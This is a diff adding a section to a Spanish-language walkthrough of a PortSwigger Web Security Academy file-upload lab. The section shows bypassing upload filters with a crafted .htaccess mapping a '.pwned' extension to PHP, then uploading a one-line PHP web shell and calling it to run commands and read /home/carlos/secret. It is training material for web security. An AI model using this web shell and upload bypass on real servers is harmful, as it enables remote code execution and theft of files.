@@ -112,6 +112,30 @@ Obtenemos el contenido del archivo secret `https://0a20003e03543e85818a53bf00510
 
 ![](/assets/img/File-Upload-Vulnerabilities-Lab-4/image_12.png)
 
+Otra alternativa es `subir` un `archivo .htaccess` que haga `que una extensión random se interprete como php`. Para ello nos `creamos` un `archivo llamado htaccess` con este `contenido` y lo `subimos`
+
+```
+AddType application/x-httpd-php .pwned
+```
+
+Cuando `pulsamos` sobre `upload` tenemos que `capturar` la `petición` y `cambiarle` el `nombre del archivo`, de `htaccess` a `.htaccess`. Esto `lo tenemos que hacer ahora porque si lo hubiéramos hecho antes, thunar no hubiera podido encontrar el archivo, ya que estaba oculto`
+
+![[Pasted image 20251109104645.png]]
+
+Si ahora nos `creamos` un `archivo llamado shell.pwned` con este `contenido` y lo `subimos`
+
+```
+<?php
+    echo "<pre>" . system($_REQUEST['cmd']) . "</pre>";
+?>
+```
+
+Podemos acceder a `https://0a20003e03543e85818a53bf005100f3.web-security-academy.net/files/avatars/shell.pwned?cmd=whoami` y `comprobar` que `podemos ejecutar comandos`
+
+![[Pasted image 20251109105007.png]]
+
+Obtenemos el contenido del archivo secret `https://0a20003e03543e85818a53bf005100f3.web-security-academy.net/files/avatars/shell.pwned?cmd=cat%20/home/carlos/secret`
+
 `Submiteamos` la `solución`
 
 ![](/assets/img/File-Upload-Vulnerabilities-Lab-4/image_13.png)
